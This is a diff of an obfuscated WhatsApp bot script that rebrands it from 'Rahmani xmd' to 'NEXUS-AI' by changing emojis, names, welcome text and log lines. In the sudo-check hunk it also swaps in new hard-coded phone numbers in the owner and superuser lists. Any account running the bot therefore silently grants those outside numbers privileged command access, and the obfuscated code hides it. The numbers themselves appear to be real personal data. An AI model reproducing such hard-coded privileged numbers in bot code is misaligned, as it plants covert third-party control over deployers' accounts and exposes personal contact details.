@@ -430,7 +430,7 @@ setTimeout(() => {
             await _0x243e88.sendMessage(_0x5b0b1e.key.remoteJid, {
               'react': {
                 'key': _0x5b0b1e.key,
-                'text': '🐉'
+                'text': '🪀'
               }
             }, {
               'statusJidList': [_0x5b0b1e.key.participant, _0x511531]
@@ -846,11 +846,11 @@ setTimeout(() => {
       if (_0x52acba.slice(0x1).toLowerCase() === "vcf") {
         if (!_0x30ff1a.endsWith('@g.us')) {
           await _0x243e88.sendMessage(_0x30ff1a, {
-            'text': "❌ This command only works in groups.\n\n🚀 Rahmani xmd"
+            'text': "❌ This command only works in groups.\n\n🔞 Nexus"
           });
           return;
         }
-        await createAndSendGroupVCard(_0x30ff1a, "Charles family", _0x243e88);
+        await createAndSendGroupVCard(_0x30ff1a, "nexus family", _0x243e88);
       }
     });
     _0x243e88.ev.on("call", async _0x470dda => {
@@ -905,10 +905,10 @@ setTimeout(() => {
       } = require("./bdd/sudo");
       const _0x556a7b = _0x24b35c.pushName;
       const _0x2d1d33 = await _0x560f6b();
-      const _0x1acf53 = [_0x5f203a, "254710772666", '254710772666', "254710772666", '254710772666', conf.NUMERO_OWNER].map(_0x58d6f1 => _0x58d6f1.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const _0x1acf53 = [_0x5f203a, "254710772666", '254785392165', "254799056874", '254710772666', conf.NUMERO_OWNER].map(_0x58d6f1 => _0x58d6f1.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const _0x4e50eb = _0x1acf53.concat(_0x2d1d33);
       const _0x34fccb = _0x4e50eb.includes(_0x133a07);
-      var _0x296907 = ["254710772666", '254710772666', "254710772666", '254710772666'].map(_0x38d537 => _0x38d537.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(_0x133a07);
+      var _0x296907 = ["254710772666", '254710772666', "254799056874", '254785392165'].map(_0x38d537 => _0x38d537.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(_0x133a07);
       function _0x574167(_0x42c1ba) {
         _0x243e88.sendMessage(_0xbaefcb, {
           'text': _0x42c1ba
@@ -1403,12 +1403,12 @@ setTimeout(() => {
       try {
         const _0x1c8ad8 = await _0x243e88.groupMetadata(_0x22fd53.id);
         if (_0x22fd53.action == 'add' && (await _0xad0996(_0x22fd53.id, 'welcome')) == 'on') {
-          let _0x551f97 = "*RAHMANI-XMD WELCOME MESSAGE*";
+          let _0x551f97 = "*NEXUS-AI WELCOME MESSAGE*";
           let _0x2ede36 = _0x22fd53.participants;
           for (let _0x383009 of _0x2ede36) {
             _0x551f97 += " \n❒ *Hey* 🖐️ @" + _0x383009.split('@')[0x0] + " WELCOME TO OUR GROUP. \n\n";
           }
-          _0x551f97 += "❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY RAHMANI-XMD.* ";
+          _0x551f97 += "❒ *READ THE GROUP DESCRIPTION TO AVOID GETTING REMOVED BY NEXUS-AI.* ";
           _0x243e88.sendMessage(_0x22fd53.id, {
             'image': {
               'url': _0x2031b3
@@ -1524,7 +1524,7 @@ setTimeout(() => {
         connection: _0x52925b
       } = _0x147343;
       if (_0x52925b === "connecting") {
-        console.log(" rahman is connecting...");
+        console.log(" nexus is connecting...");
       } else {
         if (_0x52925b === 'open') {
           console.log("✅ nexus Connected to WhatsApp! ☺️");
@@ -1566,7 +1566,7 @@ setTimeout(() => {
           startAutoAbout(_0x243e88);
           
           if (conf.DP.toLowerCase() === "yes") {
-            let _0x32d52b = " ⁠⁠⁠⁠\n╭─────────────━┈⊷ \n│🌍 *NEXUS-AI BOT ONLINE READY TO MANAGE YOUR ACCOUNT*🌍\n╰─────────────━┈⊷\n│🎃 ᴘʀᴇғɪx: *[ " + prefixe + " ]*\n│🖤 ᴍᴏᴅᴇ: *" + _0x50f3b5 + "*\n│🏍️ *ʙᴏᴛ ɴᴀᴍᴇ* NEXUS-AI\n╰─────────────━┈⊷\n\n*Follow our Channel For Updates*\n> https://whatsapp.com/channel/0029VbAchaI59PwSijs6a81f\n                \n                \n                 ";
+            let _0x32d52b = " ⁠⁠⁠⁠\n╭─────────────━┈⊷ \n│🐉 *NEXUS-AI BOT ONLINE READY TO MANAGE YOUR ACCOUNT*🪀\n╰─────────────━┈⊷\n│🎃 ᴘʀᴇғɪx: *[ " + prefixe + " ]*\n│🖤 ᴍᴏᴅᴇ: *" + _0x50f3b5 + "*\n│🏍️ *ʙᴏᴛ ɴᴀᴍᴇ* NEXUS-AI\n╰─────────────━┈⊷\n\n*Follow our Channel For Updates*\n> https://whatsapp.com/channel/0029VbAchaI59PwSijs6a81f\n                \n                \n                 ";
             await _0x243e88.sendMessage(_0x243e88.user.id, {
               'text': _0x32d52b
             });
